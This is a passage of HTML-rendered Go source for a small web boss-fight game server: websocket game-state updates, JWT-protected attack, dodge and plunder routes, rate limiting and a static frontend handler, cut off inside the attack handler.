<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">99</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">BossAttack</span><span class="token punctuation">(</span><span class="">amount </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">100</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">lastDodge</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">101</span><span class="">		</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">102</span><span class="">			gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;dodged&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amount</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">103</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">104</span><span class="">		</span><span class="token keyword">return</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">105</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">106</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">107</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">playerHealth </span><span class="token operator">-=</span><span class=""> amount
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">108</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">109</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">110</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;boss_attack&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amount</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">111</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">112</span><span class="">	gs</span><span class="token punctuation">.</span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">113</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">114</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">115</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">BossSignalAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">116</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">117</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;signal&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">118</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">119</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">120</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">121</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">BossHeal</span><span class="token punctuation">(</span><span class="">amount </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">122</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">bossHealth </span><span class="token operator">=</span><span class=""> </span><span class="token function">min</span><span class="token punctuation">(</span><span class="">gs</span><span class="token punctuation">.</span><span class="">bossHealth</span><span class="token operator">+</span><span class="">amount</span><span class="token punctuation">,</span><span class=""> MaxBossHealth</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">123</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">124</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">125</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;heal&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amount</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">126</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">127</span><span class="">	gs</span><span class="token punctuation">.</span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">128</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">129</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">130</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">TimeoutLose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">131</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">132</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;lose&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;reason&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;timed out&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">133</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">134</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">135</span><span class="">	</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="">gameStates</span><span class="token punctuation">,</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">id</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">136</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">137</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">138</span><span class=""></span><span class="token keyword">var</span><span class=""> gameStates </span><span class="token operator">=</span><span class=""> </span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int32</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">139</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">140</span><span class=""></span><span class="token keyword">var</span><span class=""> upgrader </span><span class="token operator">=</span><span class=""> websocket</span><span class="token punctuation">.</span><span class="">Upgrader</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">141</span><span class="">	ReadBufferSize</span><span class="token punctuation">:</span><span class="">  </span><span class="token number">1024</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">142</span><span class="">	WriteBufferSize</span><span class="token punctuation">:</span><span class=""> </span><span class="token number">1024</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">143</span><span class="">	CheckOrigin</span><span class="token punctuation">:</span><span class="">     </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token builtin">bool</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token keyword">return</span><span class=""> os</span><span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">&quot;BF_PRODUCTION&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">!=</span><span class=""> </span><span class="token string">&quot;true&quot;</span><span class=""> </span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">144</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">145</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">146</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">RegisterRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> http</span><span class="token punctuation">.</span><span class="">Handler </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">147</span><span class="">	r </span><span class="token operator">:=</span><span class=""> chi</span><span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">148</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">middleware</span><span class="token punctuation">.</span><span class="">Recoverer</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">149</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">FrontendHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">150</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/*&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">FrontendHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">151</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">152</span><span class="">	r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r chi</span><span class="token punctuation">.</span><span class="">Router</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">153</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">middleware</span><span class="token punctuation">.</span><span class="">Logger</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">154</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">middleware</span><span class="token punctuation">.</span><span class="token function">Timeout</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="">Second </span><span class="token operator">*</span><span class=""> </span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">155</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">httprate</span><span class="token punctuation">.</span><span class="token function">LimitByRealIP</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">156</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/new&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">NewGameHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">157</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">158</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r chi</span><span class="token punctuation">.</span><span class="">Router</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">159</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">jwtauth</span><span class="token punctuation">.</span><span class="token function">Verifier</span><span class="token punctuation">(</span><span class="">TokenAuth</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">160</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">jwtauth</span><span class="token punctuation">.</span><span class="token function">Authenticator</span><span class="token punctuation">(</span><span class="">TokenAuth</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">161</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">162</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/attack&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">AttackHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">163</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/dodge&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">DodgeHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">164</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/plunder&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">PlunderHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">165</span><span class="">			r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/ws&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">WebsocketHandler</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">166</span><span class="">		</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">167</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">168</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">169</span><span class="">	</span><span class="token keyword">return</span><span class=""> r
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">170</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">171</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">172</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">FrontendHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">173</span><span class="">	ext </span><span class="token operator">:=</span><span class=""> filepath</span><span class="token punctuation">.</span><span class="token function">Ext</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="">URL</span><span class="token punctuation">.</span><span class="">Path</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">174</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">175</span><span class="">	</span><span class="token comment">// If there is no file extension, and it does not end with a slash,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">176</span><span class="">	</span><span class="token comment">// assume it&#x27;s an HTML file and append .html</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">177</span><span class="">	</span><span class="token keyword">if</span><span class=""> ext </span><span class="token operator">==</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class=""> </span><span class="token operator">&amp;&amp;</span><span class=""> </span><span class="token operator">!</span><span class="">strings</span><span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="">URL</span><span class="token punctuation">.</span><span class="">Path</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">178</span><span class="">		r</span><span class="token punctuation">.</span><span class="">URL</span><span class="token punctuation">.</span><span class="">Path </span><span class="token operator">+=</span><span class=""> </span><span class="token string">&quot;.html&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">179</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">180</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">181</span><span class="">	http</span><span class="token punctuation">.</span><span class="token function">FileServer</span><span class="token punctuation">(</span><span class="">http</span><span class="token punctuation">.</span><span class="token function">Dir</span><span class="token punctuation">(</span><span class="token string">&quot;frontend/build&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ServeHTTP</span><span class="token punctuation">(</span><span class="">w</span><span class="token punctuation">,</span><span class=""> r</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">182</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">183</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">184</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">s </span><span class="token operator">*</span><span class="">Server</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">AttackHandler</span><span class="token punctuation">(</span><span class="">w http</span><span class="token punctuation">.</span><span class="">ResponseWriter</span><span class="token punctuation">,</span><span class=""> r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">185</span><span class="">	</span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> claims</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class=""> </span><span class="token operator">:=</span><span class=""> jwtauth</span><span class="token punctuation">.</span><span class="token function">FromContext</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="token function">Context</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
